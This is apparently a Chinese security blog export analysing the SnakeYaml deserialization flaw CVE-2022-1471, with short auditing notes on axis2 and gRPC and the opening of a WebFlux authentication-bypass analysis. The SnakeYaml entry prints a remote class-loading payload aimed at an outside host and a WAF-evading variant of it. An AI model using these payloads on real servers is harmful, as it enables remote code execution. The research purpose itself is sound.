<h1 id="axis2"><a href="#axis2" class="headerlink" title="axis2"></a>axis2</h1><p>国内可能过分追求<code>spring</code>生态相关的东西，而对其它的技术运用不是特别广泛。我觉得<code>axis2</code>就算是一个，在国外的应用中你经常就能看到他们的身影，而在国内却很少见，<br>国内<code>java</code>程序员的传统艺能就是<code>spring framework    spring mvc spring boot   spring cloud spring security</code> 等。</p>
<p><code>axis2</code>是<code>apache</code>开源的一个流行的<code>webservice</code>引擎，其可以方便地将<code>java</code>类发布为<code>service</code>，用户可以很容易地通过<code>http</code>请求调用到<code>java</code>类中定义的方法。</p>
<p><code>axis2</code>通过<code>soap</code>协议来进行数据传输，发布一个<code>service</code>只需要编写一个<code>java</code>类，然后使用工具生成一个<code>wsdl</code>文件即可，一般在黑盒情况下要了解<code>service</code>可供使用的方法，<br>只需要在需要访问的<code>service</code>路径后加上参数<code>?wsdl</code>即可，当然这需要你能够读懂<code>wsdl</code>文件并且能够根据其构造出来对应的<code>soap</code>请求。</p>
<p>嵌入式的<code>axis2</code>安装也是通过在<code>web.xml</code>中注册<code>servlet</code>实现的，寻找相关关键字就可以了，不过也没什么必要这里注册的内容只是告诉容器去解析<code>axis</code>而已，<br>具体与服务相关的东西还是要能够精准定位到<code>porttype</code>类与具体的<code>opration</code>才行，当然我们可以以<code>web.xml</code>中注册的<code>servlet</code>为突破口，找到对应的类打断点逐步调试也能找到对应的<code>service</code>类，<br>不过这需要你有足够的经验，能够根据方法名猜到其大致的功能以避免不必要的弯路。</p>
<h1 id="grpc"><a href="#grpc" class="headerlink" title="grpc"></a>grpc</h1><p><code>rpc</code>与<code>restful</code>一样都是一套与信息交换有关的规范，用户往往接触到的是<code>restful</code>风格的<code>api</code>，而隐藏在<code>restful</code>后台与微服务，过程调用等相关的规范则往往是<code>rpc</code>。<br><code>grpc</code>是<code>google</code>的一套<code>rpc</code>规范，其采用<code>http/2</code>的方式进行信息交换，众所周知相比于<code>http/1.x http/2</code>采用字节流的方式发送数据，融合了多路复用、头部压缩等多种新兴技术具备更快的速度与可靠性。</p>
<p>要实现一个<code>grpc</code>服务，首先我们需要按照<code>protobuf</code>的格式定义的<code>IDL</code>，即一个<code>.proto</code>后缀的文件，然后根据该文件使用工具编译生成与客户端请求处理相关的<code>stub</code>类，<br>以及与服务端方法定义相关的<code>ImplBase</code>类。我们通过实现<code>ImplBase</code>类通过覆写其方法类实现我们自己对外暴露的方法逻辑，然后客户端通过调用stub类同名方法来实现远程方法调用。</p>
<p>当<code>grpc</code>与<code>spring boot</code>结合的时候对我们挖洞人来说往往是不友好的，<code>spring</code>通过注解进行自动装配的思想对于开发人员来说可能很方便，但对审计人员来说可真是难受，特别是分开打包+很多<code>jar</code>的情况。</p>
]]></content>
      <categories>
        <category>安全技术</category>
      </categories>
      <tags>
        <tag>网络安全</tag>
        <tag>Java</tag>
        <tag>jetty</tag>
        <tag>axis2</tag>
        <tag>struts2</tag>
      </tags>
  </entry>
  <entry>
    <title>SnakeYaml反序列化过程与漏洞原理分析（CVE-2022-1471）</title>
    <url>/archives/f98d45ce.html</url>
    <content><![CDATA[<h1 id="SnakeYaml反序列化过程与漏洞原理分析（CVE-2022-1471）"><a href="#SnakeYaml反序列化过程与漏洞原理分析（CVE-2022-1471）" class="headerlink" title="SnakeYaml反序列化过程与漏洞原理分析（CVE-2022-1471）"></a>SnakeYaml反序列化过程与漏洞原理分析（CVE-2022-1471）</h1><blockquote>
<p>文字描述难免有所补足，请移步视频讲解：<a href="https://www.bilibili.com/video/BV1X14y1v71x/">SnakeYaml反序列化过程与漏洞原理分析（CVE-2022-1471）</a></p>
</blockquote>
<h2 id="产品介绍"><a href="#产品介绍" class="headerlink" title="产品介绍"></a>产品介绍</h2><p>SnakeYaml是一个完整的YAML1.1规范Processor，支持UTF-8&#x2F;UTF-16，支持Java对象的序列化&#x2F;<a href="https://so.csdn.net/so/search?q=%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96&spm=1001.2101.3001.7020">反序列化</a>，支持所有YAML定义的类型。</p>
<h2 id="漏洞概述"><a href="#漏洞概述" class="headerlink" title="漏洞概述"></a>漏洞概述</h2><p>该漏洞源于程序在进行反序列化过程中未对用户输入内容做合法性验证，导致了恶意代码执行。</p>
<span id="more"></span>

<h2 id="受影响版本"><a href="#受影响版本" class="headerlink" title="受影响版本"></a>受影响版本</h2><p>&lt;&#x3D; SnakeYaml 1.33</p>
<h2 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h2><h3 id="调试环境"><a href="#调试环境" class="headerlink" title="调试环境"></a>调试环境</h3><p>使用idea新建基于maven的java项目，在pom.xml中引入snakeyaml包</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.yaml<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>snakeyaml<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">version</span>&gt;</span>1.27<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>编写测试类</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> org.example;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.yaml.snakeyaml.constructor.Constructor;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Main</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> InterruptedException &#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">context</span> <span class="operator">=</span> <span class="string">&quot;!!javax.script.ScriptEngineManager [!!java.net.URLClassLoader [[!!java.net.URL [\&quot;http://i0hrz1.dnslog.cn\&quot;]]]]&quot;</span>;</span><br><span class="line">        <span class="type">Yaml</span> <span class="variable">yaml</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Yaml</span>();</span><br><span class="line">        yaml.load(context);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>在dnslog平台获取一个域名填到payload中，然后运行程序观察dnslog平台得域名解析情况，若有解析记录，则证明存在漏洞。</p>
<h3 id="漏洞原理"><a href="#漏洞原理" class="headerlink" title="漏洞原理"></a>漏洞原理</h3><p>本文我们不从漏洞手，而是首先了解以下snakeyaml时怎样进行反序列化的，观察在反序列化过程中都有哪些重要的步骤，反序列化过程中又是为何能够解析到我们提供的域名，进而能够进行远程类加载，执行恶意代码。首先我们需要打初始的断点：</p>
<p><img src="/archives/f98d45ce/image-20230814161735123.png" alt="image-20230814161735123"></p>
<p>虽然漏洞的触发入口时在load方法，但是我们首先需要关注的时yaml对象的初始化过程。</p>
<p><img src="/archives/f98d45ce/image-20230814161845728.png" alt="image-20230814161845728"></p>
<p>从上图，yaml队形初始化过程中共计涉及到5个对象的构建</p>
<table>
<thead>
<tr>
<th>对象</th>
<th>功用</th>
</tr>
</thead>
<tbody><tr>
<td>Contructor</td>
<td>对象构造器，负责JavaBean对象的构造</td>
</tr>
<tr>
<td>Representer</td>
<td>表示器，不知道有啥用，因为没有具体到它的方法，它在本漏洞中扮演的角色不是特别重要</td>
</tr>
<tr>
<td>DumperOptions</td>
<td>JavaBean对象序列化选项</td>
</tr>
<tr>
<td>LoaderOptions</td>
<td>yaml序列化数据反序列化配置选项，在漏洞修复版本中就是在该类中增加了新的反序列化选项来限制自定义的全局TAG</td>
</tr>
<tr>
<td>Resolver</td>
<td>分析器，具体作用定位不太好描述，另外还有个parser，和resolver解释很像，没太区分明白，当然仔细研究的话肯定还是可以区分。</td>
</tr>
</tbody></table>
<p>load方法会调用loadFromReader从streamReader中加载对象，而streamReader其实又封装了stringReader对象，面向对象这层层封装还是挺恶心的。</p>
<p><img src="/archives/f98d45ce/image-20230814162654884.png" alt="image-20230814162654884"></p>
<p>可以看到就是封装了一些元数据，包括数据窗口的大小，数据长度，数据流，流是否结束标志，缓冲区等，而在StringReader中也仅封装了字符串长度与字符串字面量而已。</p>
<p><img src="/archives/f98d45ce/image-20230814162937919.png" alt="image-20230814162937919"></p>
<p>loadFromReader方法主要完成composer（构建器）的创建以及数据的构建。</p>
<p><img src="/archives/f98d45ce/image-20230814163122111.png" alt="image-20230814163122111"></p>
<p>构建器里主要封装了解析器、分析器、反序列化配置、锚点、递归节点等数据。</p>
<p>解析器里封装了扫描器，扫描器负责对序列化字符串进行逐个字符扫描以获取token、元素入口与出口、获取键与值、块入口与出口等。</p>
<p>分析器主要负责通过数据内容来推测对应的数据类型，Yaml语法中主要包含三种数据类型即序列、映射与标量，所谓序列就是列表、数组类似的概念，映射可以理解为Python中的字典、Java中的Map，标量时Yaml中的最小的不可再分的基本数据类型，包括字符串、整数、浮点数、日期时间等类型。</p>
<p>通过contrutor的getSingleData方法可以获得到一个type指定类型的对象。其首先需要调用composer的getSingleNode方法获取到一个Node对象，该Node对象时对我们传入的序列化数据的格式化解析与封装。然后电泳constructDocument方法通过Node对象获取最终的目标对象。</p>
<p><img src="/archives/f98d45ce/image-20230814164251442.png" alt="image-20230814164251442"></p>
<p>我们首先关注getSingleNode方法。进入该方法会首先通过解析器对事件进行配置</p>
<p><img src="/archives/f98d45ce/image-20230814164458986.png" alt="image-20230814164458986"></p>
<p>可以看到获取事件时其实时同故宫state对象进行创建的，而state对象其实是一个Production接口的实例。</p>
<p><img src="/archives/f98d45ce/image-20230814164703271.png" alt="image-20230814164703271"></p>
<p>其有很多的实现类，分别对应不同的节点类型的不同处理阶段。</p>
<p><img src="/archives/f98d45ce/image-20230814164959202.png" alt="image-20230814164959202"></p>
<p>我们在初始化解析器的时候会初始化state对下个为ParseStreamStart的实例</p>
<p><img src="/archives/f98d45ce/image-20230814165131638.png" alt="image-20230814165131638"></p>
<p>故此处调用的produce方法即是<code>org.yaml.snakeyaml.parser.ParserImpl.ParseStreamStart#produce</code>，在该方法中获取了获取了流解析开始事件并重置了state为下一阶段的隐式文档解析开始状态。每一个事件中都包含两个重要的标志Mark，一个称之为startMark一个称之为endMark，分别标识了当前事件处理的开始与结束位置</p>
<p><img src="/archives/f98d45ce/image-20230814165258362.png" alt="image-20230814165258362"></p>
<p>在获取到事件后，判断事件是否为流结束事件，若不是则进入到节点解析逻辑。在此逻辑开始时会调用getEvent方法获取一个开始事件，待composeNode方法调用完毕后，再嗲用getEvent方法获取到一个结束事件，最后对锚点与记录的递归节点进行清理。</p>
<p><img src="/archives/f98d45ce/image-20230814170038625.png" alt="image-20230814170038625"></p>
<p>在composeNode方法中主要有两个分支，如果你的序列化数据设置了锚点与别名此时会进入第一个分支，若没有则会进入到else分支，我们这里会进入到else分支。</p>
<p><img src="/archives/f98d45ce/image-20230814170426979.png" alt="image-20230814170426979"></p>
<p>在else分支中还是首先会把事件往前推一次，获得的NodeEvent主要包含三种类型分别为ScalarNode SequenceNode MappingNode，即我们开始谈到的Yaml格式的三种类型标量、序列以及映射，很明显我们这里会进入到序列的处理逻辑里面。</p>
<p>在composeSequenceNode方法中首先设置事件为SequenceStartEvent，即序列处理开始，然后会尝试获取Tag，关于tag的内容可以在<a href="https://yaml.org/spec/1.2.2/#tag-shorthands%E4%BA%86%E8%A7%A3%EF%BC%8C%E7%84%B6%E5%90%8E%E5%88%9B%E5%BB%BA%E4%B8%80%E4%B8%AASequenceNode%E5%AF%B9%E8%B1%A1%EF%BC%8C%E5%9C%A8%E6%9E%84%E9%80%A0SequenceNode%E5%AF%B9%E8%B1%A1%E6%97%B6%E4%BC%9A%E5%B0%86children%E5%BD%93%E4%BD%9C%E5%8F%82%E6%95%B0%E4%BC%A0%E8%BF%9B%E5%8E%BB%E8%B5%8B%E5%80%BC%E7%BB%99%E5%B1%9E%E6%80%A7this.value%EF%BC%8C%E6%88%91%E4%BB%AC%E7%9F%A5%E9%81%93ArrayList%E6%98%AF%E5%BC%95%E7%94%A8%E7%B1%BB%E5%9E%8B%EF%BC%8C%E8%8B%A5%E4%BB%A5%E5%A4%96%E7%A7%92%E5%AF%B9children%E7%9A%84%E4%BF%AE%E6%94%B9%E5%B0%86%E5%BD%B1%E5%93%8D%E5%88%B0SequenceNode%E4%B8%AD%E7%9A%84%E5%80%BC%E3%80%82%E7%84%B6%E5%90%8E%E5%97%B2%E7%94%A8composeNode%E6%96%B9%E6%B3%95%E7%BB%A7%E7%BB%AD%E8%BF%9B%E8%A1%8C%E8%8A%82%E7%82%B9%E5%90%8E%E8%A7%81%E5%B9%B6%E6%B7%BB%E5%8A%A0%E5%88%B0children%E4%B8%AD%E4%BD%9C%E4%B8%BASequenceNode%E7%9A%84%E5%AD%90%E8%8A%82%E7%82%B9%E3%80%82%E5%88%B0%E8%BF%99%E9%87%8C%E5%B0%B1%E5%B7%B2%E7%BB%8F%E5%BC%80%E5%A7%8B%E9%80%92%E5%BD%92%E8%A7%A3%E6%9E%90%E4%BA%86%EF%BC%8C%E7%9B%B4%E5%88%B0%E8%A7%A3%E6%9E%90%E5%88%B0StreamEnd%E3%80%82">https://yaml.org/spec/1.2.2/#tag-shorthands了解，然后创建一个SequenceNode对象，在构造SequenceNode对象时会将children当作参数传进去赋值给属性this.value，我们知道ArrayList是引用类型，若以外秒对children的修改将影响到SequenceNode中的值。然后嗲用composeNode方法继续进行节点后见并添加到children中作为SequenceNode的子节点。到这里就已经开始递归解析了，直到解析到StreamEnd。</a></p>
<p><img src="/archives/f98d45ce/image-20230814170947063.png" alt="image-20230814170947063"></p>
<p>在获取到Node后，就进入到目标对象构建的流程中</p>
<p><img src="/archives/f98d45ce/image-20230814172249327.png" alt="image-20230814172249327"></p>
<p>在constructObject方法中还对获取到的node对象进行了缓存检查</p>
<p><img src="/archives/f98d45ce/image-20230814172306770.png" alt="image-20230814172306770"></p>
<p>在调用getConstructor时会首先从预设好的13中内置构造器中尝试选择，若没有匹配的则返回一个ConstructYamlObject的构造器，然后调用器ConstructYamlObject的getConstructor方法通过反射的方式获得目标类的Class实例，然后根据Node类型获取到不同的几点构造器，此处为ContructSequence</p>
<p>然后调用器construct方法，该方法也时通过节点tag的不同类型选择不同的处理逻辑，这里会进入到可变对象的对象构建逻辑中。由下图，在这个逻辑中会首先获取当前Node的value属性，也就是子节点的尺寸然后与获得的目标类的构造方法的参数尺寸进行比较，若成功匹配则依次对直接点调用constructObjec递归构建对象然后作为父节点的构造方法参数传参同通过反射的方式进行实例化。</p>
<p><img src="/archives/f98d45ce/image-20230814173636570.png" alt="image-20230814173636570"></p>
<p>在我们提供的payload中，也就是最终我们要构建的类是javax.script.ScriptEngineManager，构造该类调用的是其含有一个参数的有参构造方法，其参数为一个类加载器java.net.URLClassLoader，而在构造java.net.URLClassLoader时也是调用其含有一个参数的有参构造方法不过其参数时一个数组，所以我们会考到java.net.URLClassLoader后嵌套了两层[[，其数组类型为java.net.URL。我们知道URLClassLoader会从传入的URL进行远程的类加载工作，那么这个payload极有可能涉及到远程恶意类加载与实例化。那么ScriptEngineManager的构造方法又做了什么呢</p>
<p><img src="/archives/f98d45ce/image-20230814174418936.png" alt="image-20230814174418936"></p>
<p><img src="/archives/f98d45ce/image-20230814174500741.png" alt="image-20230814174500741"></p>
<p><img src="/archives/f98d45ce/image-20230814174437825.png" alt="image-20230814174437825"></p>
<p>可以看到这是一个很明显的SPI调用过程，我们只需要在远程部署一个实现了ScriptEngineFactory接口的类，并子啊其静态代码块中写入命令执行的代码，并在其Classpath:META-INFO&#x2F;services&#x2F;javax.script.ScriptEngineFactory文件中应用该实现类即可完成利用。具体的远程RCE可以上网自行寻找。</p>
<p>在最新版的snake中该漏洞得到了修复，官方通过在loadConfigs对象中引入了新的配置项并且限制了反序列化递归调用嵌套深度的方式来对反序列化漏洞进行了限制。</p>
<p>限制递归深度在org.yaml.snakeyaml.composer.Composer#increaseNestingDepth方法中检查，最大深度默认为50层</p>
<p><img src="/archives/f98d45ce/image-20230814193403071.png" alt="image-20230814193403071"></p>
<p>目标类类型检查在下图处检查，首先节点Tag是否是自定义的全局tag如果是则调用org.yaml.snakeyaml.inspector.TagInspector#isGlobalTagAllowed方法进行检查，TagInspector是一个接口，其默认实现是org.yaml.snakeyaml.inspector.UnTrustedTagInspector。isGlobalTagAllowed方法默认返回false，即不允许使用全局的Tag。</p>
<p><img src="/archives/f98d45ce/image-20230814193503552.png" alt="image-20230814193503552"></p>
<p>我们在编写代码的时候如果需要指定发序列化的目标类类型则必须要实现TagInspector接口，重写isGlobalTagAllowed方法，然后将其注入到LoaderOptions实例化对象中。</p>
<p>默认不允许使用全局tag</p>
<p><img src="/archives/f98d45ce/image-20230814194127911.png" alt="image-20230814194127911"></p>
<p>实现TagInspector接口，此处直接返回true，也可以在isGlobalTagAllowed方法中根据tag来进行逻辑判断决定允许哪些类能被反序列化。</p>
<p><img src="/archives/f98d45ce/image-20230814194330452.png" alt="image-20230814194330452"></p>
<p>重写isGlobalTagAllowed方法后的结果</p>
<p><img src="/archives/f98d45ce/image-20230814194609615.png" alt="image-20230814194609615"></p>
<p>远程类加载</p>
<p><img src="/archives/f98d45ce/image-20230814194851114.png" alt="image-20230814194851114"></p>
<p>在分析的过程中我发现了一些好玩的地方，手下时除了load方法可以利用该payload外，如果我们使用的时loadAs方法被人制定了目标类的类型应该怎么办？</p>
<p>当然如果类型不匹配，即ScriptEngineFactory如果不是目标类的子类或这实现类，就没得玩，但是如果是一些抽象级别比较高的类还是大有可为的，比如xxxx组件就是这么干的，嗯一个CVE到手了。</p>
<p>两外我们可以利用Yaml语法中的TAG特性来实现WAF绕过，我们只需要对payload进行以下的变形</p>
<figure class="highlight yaml"><table><tr><td class="code"><pre><span class="line"><span class="string">%TAG</span> <span class="type">!m</span><span class="string">!</span> <span class="string">tag:yaml.org,2002:java</span></span><br><span class="line"><span class="meta">---</span></span><br><span class="line"><span class="type">!m!x.script.ScriptEngineManager</span> [<span class="type">!m!.net.URLClassLoader</span> [[<span class="type">!m!.net.URL</span> [<span class="string">&quot;http://i0hrz1.dnslog.cn&quot;</span>]]]]</span><br><span class="line"><span class="string">...</span></span><br></pre></td></tr></table></figure>

<p>依旧RCE，还可以用来绕WAF</p>
<p><img src="/archives/f98d45ce/image-20230814195046711.png" alt="image-20230814195046711"></p>
<h2 id="修复措施"><a href="#修复措施" class="headerlink" title="修复措施"></a>修复措施</h2><ol>
<li>升级软件到不受影响的版本或最新版，最新版maven仓库地址：<a href="https://mvnrepository.com/artifact/org.yaml/snakeyaml/2.1%E3%80%82">https://mvnrepository.com/artifact/org.yaml/snakeyaml/2.1。</a></li>
<li>限制服务器出网</li>
</ol>
<h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><ul>
<li><a href="https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2022-1471">https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2022-1471</a></li>
<li><a href="https://www.cvedetails.com/cve-details.php?t=1&cve_id=CVE-2022-1471">https://www.cvedetails.com/cve-details.php?t=1&amp;cve_id=CVE-2022-1471</a></li>
<li><a href="https://www.cnnvd.org.cn/home/globalSearch?keyword=CVE-2022-1471">https://www.cnnvd.org.cn/home/globalSearch?keyword=CVE-2022-1471</a></li>
<li><a href="https://www.cnblogs.com/nice0e3/p/14514882.html">https://www.cnblogs.com/nice0e3/p/14514882.html</a></li>
<li><a href="https://y4tacker.github.io/2022/02/08/year/2022/2/SnakeYAML%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%8F%8A%E5%8F%AF%E5%88%A9%E7%94%A8Gadget%E5%88%86%E6%9E%90/">https://y4tacker.github.io/2022/02/08/year/2022/2/SnakeYAML%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%8F%8A%E5%8F%AF%E5%88%A9%E7%94%A8Gadget%E5%88%86%E6%9E%90/</a></li>
<li><a href="https://www.cnblogs.com/R0ser1/p/16213257.html">https://www.cnblogs.com/R0ser1/p/16213257.html</a></li>
</ul>
]]></content>
      <categories>
        <category>漏洞分析</category>
        <category>安全技术</category>
      </categories>
      <tags>
        <tag>RCE</tag>
        <tag>反序列化</tag>
        <tag>网络安全</tag>
        <tag>漏洞分析</tag>
        <tag>漏洞</tag>
        <tag>SnakeYaml</tag>
        <tag>CVE-2022-1471</tag>
      </tags>
  </entry>
  <entry>
    <title>WebFlux Security 认证绕过（CVE-2023-34034）</title>
    <url>/archives/fe3c6472.html</url>
    <content><![CDATA[<h1 id="WebFlux-Security-认证绕过（CVE-2023-34034）"><a href="#WebFlux-Security-认证绕过（CVE-2023-34034）" class="headerlink" title="WebFlux Security 认证绕过（CVE-2023-34034）"></a>WebFlux Security 认证绕过（CVE-2023-34034）</h1><h2 id="产品介绍"><a href="#产品介绍" class="headerlink" title="产品介绍"></a>产品介绍</h2><p>Spring WebFlux 是 Spring Framework 5.0 中引入的新的响应式Web框架。与Spring MVC不同，它不需要Servlet API，是完全异步且非阻塞的，并且通过Reactor项目实现了Reactive Streams规范。Spring WebFlux 可用于创建基于事件循环执行模型的完全异步且非阻塞的应用程序。</p>
<h2 id="漏洞概述"><a href="#漏洞概述" class="headerlink" title="漏洞概述"></a>漏洞概述</h2><p>当WebFlux使用了Spring Security进行用户认证与鉴权时，若错误地使用了无前导”&#x2F;“的路径通配符”**“，程序将因为WebFlux与Spring Security对其不同的解析模式差异导致可能的认证绕过。</p>
<span id="more"></span>

<h2 id="受影响版本"><a href="#受影响版本" class="headerlink" title="受影响版本"></a>受影响版本</h2><ul>
<li>6.1.0 to 6.1.1</li>
<li>6.0.0 to 6.0.4</li>
<li>5.8.0 to 5.8.4</li>
<li>5.7.0 to 5.7.9</li>
<li>5.6.0 to 5.6.11</li>
</ul>
<h2 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h2><h3 id="调试环境"><a href="#调试环境" class="headerlink" title="调试环境"></a>调试环境</h3><p>使用idea新建基于maven的java项目，在pom.xml中引入相关依赖包</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=<span class="string">&quot;1.0&quot;</span> encoding=<span class="string">&quot;UTF-8&quot;</span>?&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">project</span> <span class="attr">xmlns</span>=<span class="string">&quot;http://maven.apache.org/POM/4.0.0&quot;</span> <span class="attr">xmlns:xsi</span>=<span class="string">&quot;http://www.w3.org/2001/XMLSchema-instance&quot;</span></span></span><br><span class="line"><span class="tag">         <span class="attr">xsi:schemaLocation</span>=<span class="string">&quot;http://maven.apache.org/POM/4.0.0 https://maven.apache.org/xsd/maven-4.0.0.xsd&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">modelVersion</span>&gt;</span>4.0.0<span class="tag">&lt;/<span class="name">modelVersion</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">parent</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.springframework.boot<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>spring-boot-starter-parent<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">version</span>&gt;</span>2.6.14<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">relativePath</span>/&gt;</span> <span class="comment">&lt;!-- lookup parent from repository --&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">parent</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>com.example<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>ssawt<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">version</span>&gt;</span>0.0.1-SNAPSHOT<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">name</span>&gt;</span>SpringSecurityAndWebfluxTest<span class="tag">&lt;/<span class="name">name</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">description</span>&gt;</span>SpringSecurityAntWebfluxTest<span class="tag">&lt;/<span class="name">description</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">properties</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">java.version</span>&gt;</span>1.8<span class="tag">&lt;/<span class="name">java.version</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">properties</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">dependencies</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.springframework.boot<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>spring-boot-starter-security<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.springframework.boot<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>spring-boot-starter-webflux<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">dependencies</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">project</span>&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>这里使用spring-boot-starter-parent版本为2.6.14，其依赖的Spring Security版本为5.6.9，为存在漏洞版本；</p>
<p>为了对比，使用spring-boot-starter-parent版本2.7.14作为漏洞修复版本，其依赖的Spring Security 版本为5.7.10，为修复版本。</p>
<p>为了能够进行漏洞复现，我们需要使用WebFlux编写一部分代码，并使用Spring Security作为认证框架。</p>
<p><img src="/archives/fe3c6472/image-20230822100900918.png" alt="image-20230822100900918"></p>
<p>上图是调试代码的结构，我们使用Spring Boot来搭建项目，并编写了一个控制器<code>HelloController</code>，该控制器中定义了一个路由处理方法，即所有访问<code>http://127.0.0.1:8080/hello-dev/xxxx</code>的请求都由该方法进行处理。</p>
<p><img src="/archives/fe3c6472/image-20230822101052260.png" alt="image-20230822101052260"></p>
<p>另外设置了5个响应处理器，分别对无访问权限、未认证、认证失败、认证成功、登出成功的情况进行处理。在<code>AuthorizationConfig</code>中定义了基于内存的用户名密码以及路由规则</p>
<p><img src="/archives/fe3c6472/image-20230822101411599.png" alt="image-20230822101411599"></p>
<p>关于如何在WebFlux中使用Spring Security可以参考该文章：<a href="https://juejin.cn/post/7220662065294770233">https://juejin.cn/post/7220662065294770233</a></p>
<h3 id="漏洞原理"><a href="#漏洞原理" class="headerlink" title="漏洞原理"></a>漏洞原理</h3><p>一般来说，对于只有漏洞编号的漏洞，我们若要进行复现，第一步需要做的就是进行信息收集，信息收集是为了达成以下几个目的：</p>
<ul>
<li>获取官方或者第三方漏洞通告中关于漏洞描述的蛛丝马迹，这些通告中的漏洞描述往往泄露大量的信息；</li>
<li>是否已有安全研究员披露漏洞详情；</li>
<li>漏洞是否修复，修复的Commit ID是多少。</li>
</ul>
<p>对于该漏洞来说，Spring 官方发布了一则通告：</p>
<p><a href="https://spring.io/security/cve-2023-34034">https://spring.io/security/cve-2023-34034</a></p>
<p><img src="/archives/fe3c6472/image-20230822102006591.png" alt="image-20230822102006591"></p>
<p>在该漏洞描述中提到，在WebFlux中为Spring Security配置使用”**”这种模式的正则将导致Spring Security 与 Spring WebFlux的行为不一致从而导致认证绕过。这里可以提取到一个关键点就是需要在Spring Security中使用”**&quot;进行模式匹配才会导致漏洞。当然这点信息可能不太够，所以我们继续搜索，于是发现了下面这篇帖子：</p>
<p><a href="https://www.oschina.net/news/249933">https://www.oschina.net/news/249933</a></p>
<p><img src="/archives/fe3c6472/image-20230822102343166.png" alt="image-20230822102343166"></p>
<p>这篇帖子里已经由关于该漏洞较多的信息泄露了。原来在Spring Security中”**“不能匹配路径分隔符”&#x2F;“，而在Spring WebFlux中却可以匹配路径分隔符。</p>
<p>可能看到这里，我们对具体的绕过姿势还不是特别清楚。在该通告的最后提供了该漏洞的修复记录：</p>
<p><a href="https://github.com/spring-projects/spring-security/commit/7813a9ba26e53fe54e4d2ec6eb076126e8550780">https://github.com/spring-projects/spring-security/commit/7813a9ba26e53fe54e4d2ec6eb076126e8550780</a></p>
<p>在该修复记录中，增加了一处测试代码：</p>
<p><img src="/archives/fe3c6472/image-20230822102847635.png" alt="image-20230822102847635"></p>
